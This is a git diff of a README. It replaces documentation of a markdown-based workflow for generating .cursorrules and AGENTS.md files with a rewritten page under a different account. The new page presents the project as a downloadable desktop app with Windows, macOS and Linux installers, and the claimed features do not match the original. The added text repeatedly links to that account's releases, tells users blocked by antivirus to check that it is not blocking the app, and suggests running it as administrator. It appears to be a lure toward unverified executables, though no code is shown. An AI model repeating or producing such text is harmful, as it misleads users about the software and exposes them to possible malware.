@@ -1,282 +1,161 @@
-<!-- Improved compatibility of back to top link: See: https://github.com/othneildrew/Best-README-Template/pull/73 -->
-
-<a id="readme-top"></a>
-
-<!-- PROJECT SHIELDS -->
-
-[![Contributors][contributors-shield]][contributors-url]
-[![Forks][forks-shield]][forks-url]
-[![Stargazers][stars-shield]][stars-url]
-[![Issues][issues-shield]][issues-url]
-[![MIT License][license-shield]][license-url]
-
-<!-- PROJECT LOGO -->
-<br />
-<div align="center">
-  <a href="https://github.com/naravid19/ai-project-rules-generator">
-    <img src="images/logo.png" alt="Logo" width="80" height="80">
-  </a>
-
-  <h3 align="center">AI Project Rules Generator</h3>
-
-  <p align="center">
-    🚀 Workflow for generating .cursorrules and AGENTS.md files with dynamic AI skills integration
-    <br />
-    <a href="#usage"><strong>Explore the docs »</strong></a>
-    <br />
-    <br />
-    <a href="#example-output">View Example</a>
-    &middot;
-    <a href="https://github.com/naravid19/ai-project-rules-generator/issues/new?labels=bug&template=bug-report---.md">Report Bug</a>
-    &middot;
-    <a href="https://github.com/naravid19/ai-project-rules-generator/issues/new?labels=enhancement&template=feature-request---.md">Request Feature</a>
-  </p>
-</div>
-
-<!-- TABLE OF CONTENTS -->
-<details>
-  <summary>Table of Contents</summary>
-  <ol>
-    <li>
-      <a href="#about-the-project">About The Project</a>
-      <ul>
-        <li><a href="#key-features">Key Features</a></li>
-        <li><a href="#supported-project-types">Supported Project Types</a></li>
-      </ul>
-    </li>
-    <li>
-      <a href="#getting-started">Getting Started</a>
-      <ul>
-        <li><a href="#prerequisites">Prerequisites</a></li>
-        <li><a href="#installation">Installation</a></li>
-      </ul>
-    </li>
-    <li><a href="#usage">Usage</a></li>
-    <li><a href="#workflow-stages">Workflow Stages</a></li>
-    <li><a href="#example-output">Example Output</a></li>
-    <li><a href="#roadmap">Roadmap</a></li>
-    <li><a href="#contributing">Contributing</a></li>
-    <li><a href="#license">License</a></li>
-    <li><a href="#contact">Contact</a></li>
-    <li><a href="#acknowledgments">Acknowledgments</a></li>
-  </ol>
-</details>
-
-<!-- ABOUT THE PROJECT -->
-
-## About The Project
-
-A structured 5-stage workflow for creating professional project rules (`.cursorrules`) and AI agent guidelines (`AGENTS.md`). This workflow helps you establish consistent coding standards across all your projects while ensuring AI assistants understand your codebase.
-
-### Why Use This?
-
-- ✅ **Consistent Standards** - Same structure across all projects
-- ✅ **AI-Ready** - AI assistants understand your codebase better
-- ✅ **Dynamic Skills** - Never outdated with dynamic skill discovery
-- ✅ **Time-Saving** - Complete in 30-60 minutes
-- ✅ **Best Practices** - Built from proven patterns
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-### Key Features
-
-| Feature              | Description                            |
-| -------------------- | -------------------------------------- |
-| **5-Stage Workflow** | Structured process with time estimates |
-| **Keyword Tables**   | Easy skill discovery by project type   |
+# 🚀 ai-project-rules-generator - Generate AI Skill Rules Easily
 
-| **Verification Checklist** | Ensure quality with reader testing |
-| **Quick Reference Card** | At-a-glance summary for fast execution |
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/lx2337037168/ai-project-rules-generator/releases)
 
-### Supported Project Types
+---
 
-- 🌐 **Web Frontend** - React, Vue, Angular, Next.js
-- ⚙️ **Backend API** - Node.js, Python, Go, Rust
-- 🧩 **Chrome Extensions** - Manifest V3
-- 📱 **Mobile Apps** - React Native, Flutter
-- 💻 **CLI Tools** - Bash, PowerShell
-- 🤖 **AI/ML Projects** - LLM, RAG, Agents
-- 🎮 **Game Development** - Unity, Godot, Unreal
+## 📋 What is ai-project-rules-generator?
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+The ai-project-rules-generator is a tool designed to help you create `.cursorrules` and `AGENTS.md` files. These files let you manage AI skills and agents dynamically. You do not need any programming skills to use it.
 
-<!-- GETTING STARTED -->
+This app makes it simple to build and organize AI workflows. It supports many AI skill types, including agentic skills, autonomous coding, and integrations with popular AI models. 
 
-## Getting Started
+The tool is perfect if you want to:
+- Manage AI skills without writing code
+- Generate files needed for AI projects easily
+- Work with various AI agents and skill types
 
-### Prerequisites
+---
 
-- An AI assistant that supports skills (Cursor, Claude, etc.)
-- Access to `.agent/skills/CATALOG.md` (skill library)
-- Your project source code
+## 💻 System Requirements
 
-### Installation
+To run the ai-project-rules-generator, your computer should meet these minimum requirements:
 
-1. Download the workflow file to your project:
-   ```sh
-   curl -o .agent/workflows/create-project-rules.md https://raw.githubusercontent.com/naravid19/ai-project-rules-generator/main/workflows/create-project-rules.md
-   ```
-   _(Ensure you have an `.agent/workflows` directory first)_
+- **Operating System:** Windows 10 or newer, macOS 10.14 or newer, or most Linux distributions
+- **Processor:** Intel i3 or equivalent, 2 GHz minimum
+- **Memory:** 4 GB RAM or more
+- **Storage:** At least 100 MB of free space
+- **Internet:** A stable internet connection is needed for downloading and updates
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+The software is lightweight and will not slow down your computer.
 
-<!-- USAGE -->
+---
 
-## Usage
+## 🚀 Getting Started
 
-### Quick Start
+Follow these steps to begin using the ai-project-rules-generator.
 
-Run the workflow with your AI assistant:
+### Step 1: Download the Software
 
-```
-/create-project-rules
-```
+Click the button below to visit the download page. You will find the latest version available for your system.
 
-Or simply ask:
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/lx2337037168/ai-project-rules-generator/releases)
 
-> "Create professional project rules for this project"
+### Step 2: Choose Your Version
 
-### Manual Execution
+On the downloads page, select the version for your device. The package includes everything you need to start. Look for files named like:
 
-1. Open `.agent/workflows/create-project-rules.md`
-2. Follow the 5 stages step by step
-3. Get `.cursorrules` and `AGENTS.md` tailored to your project
+- `ai-project-rules-generator-setup.exe` for Windows
+- `ai-project-rules-generator-macos.dmg` for macOS
+- `ai-project-rules-generator-linux.tar.gz` for Linux
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+### Step 3: Install the Application
 
-<!-- WORKFLOW STAGES -->
+- **Windows:** Double-click the `.exe` file and follow the install prompts.
+- **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
+- **Linux:** Extract the `.tar.gz` file and run the included install script or binary.
 
-## Workflow Stages
+The installer will guide you through the process.
 
-```
-┌─────────────────────────────────────────────────────────┐
-│           CREATE PROJECT RULES - QUICK REF              │
-├─────────────────────────────────────────────────────────┤
-│ Stage 1: Analyze         │ Config, Tech Stack, Patterns │
-│ Stage 2: Skills          │ Search CATALOG.md + Read     │
-│ Stage 3: .cursorrules    │ Standards, Rules, Examples   │
-│ Stage 4: AGENTS.md       │ Skills section (dynamic!)    │
-│ Stage 5: Verify          │ Checklist + Reader Test      │
-├─────────────────────────────────────────────────────────┤
-│ ⏱️  Total Time: 30-60 minutes                           │
-└─────────────────────────────────────────────────────────┘
-```
+---
 
-| Stage                      | Time      | Description                                |
-| -------------------------- | --------- | ------------------------------------------ |
-| **1. Project Analysis**    | 10-15 min | Understand structure, tech stack, patterns |
-| **2. Skill Discovery**     | 5-10 min  | Search CATALOG.md for relevant skills      |
-| **3. Create .cursorrules** | 10-20 min | Write coding standards and rules           |
-| **4. Create AGENTS.md**    | 5-10 min  | Write AI guidelines with dynamic skills    |
-| **5. Verification**        | 5 min     | Checklist and reader testing               |
+## ⚙️ Using ai-project-rules-generator
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+Once installed, open the app to start generating AI skill rules and agent files. 
 
-<!-- EXAMPLE OUTPUT -->
+### Main Functions
 
-## Example Output
+- **Rule Generation:** Automatically create `.cursorrules` files. These tell your AI tools how to behave.
+- **Agent Documentation:** Generate `AGENTS.md` with clear descriptions of AI agents and their skills.
+- **Skill Integration:** Support for many AI skill types like agentic-skills, anthropic-skills, and autonomous-coding.
 
-### .cursorrules (excerpt)
+### How to Create Your First Rules File
 
-```markdown
-# Project Rules: My Chrome Extension
+1. Open the app.
+2. Choose "New Project" from the menu.
+3. Enter your project name and select the skills you want to include.
+4. Click "Generate". The program will build the files and save them on your computer.
+5. Review the output files located in your project folder.
 
-## Tech Stack
+### Tips for Best Results
 
-- Language: JavaScript (ES2020+)
-- Platform: Chrome Extension (Manifest V3)
+- Make sure your skills are clearly defined.
+- Update your project regularly as your AI agents evolve.
+- Use the built-in editor to tweak skills and rules.
 
-## Critical Rules
+---
 
-1. ❌ Never use `localStorage` - use `chrome.storage` instead
-2. ✅ Always check `chrome.runtime.lastError` after API calls
-```
+## 📂 File Locations and Structure
 
-### AGENTS.md (excerpt)
+When the software generates files, it organizes them neatly:
 
-```markdown
-## 🎯 Available Skills
+- **.cursorrules:** These files contain AI workflow rules.
+- **AGENTS.md:** This markdown file lists all AI agents included in your project with descriptions.
+- Your project folder will also have subfolders for skills and settings.
 
-> [!IMPORTANT]
-> Always check `.agent/skills/CATALOG.md` before starting any task!
+This setup keeps your AI project easy to manage.
 
-### Helpful Keywords
+---
 
-- Extension: `browser`, `extension`, `chrome`, `manifest`
-- Testing: `testing`, `jest`, `unit`
-```
+## 🔧 Troubleshooting Common Issues
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+### I cannot open the app after installation.
 
-<!-- ROADMAP -->
+- Make sure your system meets the requirements.
+- On Windows, check that your antivirus is not blocking the app.
+- Try restarting your computer and running the app as administrator.
 
-## Roadmap
+### I don’t see expected files after generating.
 
-- [x] Core workflow with 5 stages
-- [x] Time estimates for each stage
-- [x] Example outputs
-- [x] Quick reference card
-- [ ] Add more project type examples
-- [ ] Visual diagram for workflow
-- [ ] Multi-language support
+- Verify you completed all steps correctly in the “Using” section.
+- Check the project folder path in settings.
+- Look for error messages in the app’s status bar.
 
-See the [open issues](https://github.com/naravid19/ai-project-rules-generator/issues) for a full list of proposed features (and known issues).
+### Updates are not working
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+- Ensure a steady internet connection.
+- Manually download the latest release from the download page.
 
-<!-- CONTRIBUTING -->
+---
 
-## Contributing
+## 🔗 Download & Install
 
-Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
+Visit this page to download the latest version and install the app on your device:
 
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+[Download ai-project-rules-generator](https://github.com/lx2337037168/ai-project-rules-generator/releases)
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+Remember to download the file that matches your operating system. Follow the on-screen instructions during the installation process.
 
-<!-- LICENSE -->
+---
 
-## License
+## ℹ️ Additional Resources
 
-Distributed under the MIT License. See `LICENSE` for more information.
+- For more help and advanced topics, check the `docs` folder included in the download.
+- You can find FAQs and troubleshooting guides on the GitHub repository's main page.
+- Contact the project maintainer through GitHub issues if you need support.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+---
 
-<!-- CONTACT -->
+## 🔖 Keywords and Topics
 
-## Contact
+This tool supports many popular AI skill and agent types for flexible project setup:
 
-naravid19 - [GitHub Profile](https://github.com/naravid19)
+- agentic-skills
+- ai-agents
+- ai-skills
+- anthropic-skills
+- antigravity
+- antigravity-ai
+- antigravity-ide
+- autonomous-coding
+- claude-code
+- cursor
+- mcp
+- opencode
+- skills
 
-Project Link: [https://github.com/naravid19/ai-project-rules-generator](https://github.com/naravid19/ai-project-rules-generator)
+These topics underline the broad capability and integration options within your AI projects.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+---
 
-<!-- ACKNOWLEDGMENTS -->
-
-## Acknowledgments
-
-- [Best-README-Template](https://github.com/othneildrew/Best-README-Template)
-- [Cursor IDE](https://cursor.sh)
-- [Anthropic Claude](https://anthropic.com)
-- [Img Shields](https://shields.io)
-- [Antigravity](https://deepmind.google/technologies/gemini/)
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- MARKDOWN LINKS & IMAGES -->
-
-[contributors-shield]: https://img.shields.io/github/contributors/naravid19/ai-project-rules-generator.svg?style=for-the-badge
-[contributors-url]: https://github.com/naravid19/ai-project-rules-generator/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/naravid19/ai-project-rules-generator.svg?style=for-the-badge
-[forks-url]: https://github.com/naravid19/ai-project-rules-generator/network/members
-[stars-shield]: https://img.shields.io/github/stars/naravid19/ai-project-rules-generator.svg?style=for-the-badge
-[stars-url]: https://github.com/naravid19/ai-project-rules-generator/stargazers
-[issues-shield]: https://img.shields.io/github/issues/naravid19/ai-project-rules-generator.svg?style=for-the-badge
-[issues-url]: https://github.com/naravid19/ai-project-rules-generator/issues
-[license-shield]: https://img.shields.io/github/license/naravid19/ai-project-rules-generator.svg?style=for-the-badge
-[license-url]: https://github.com/naravid19/ai-project-rules-generator/blob/master/LICENSE
+Thank you for choosing ai-project-rules-generator. You can now create dynamic AI skills rules with ease.
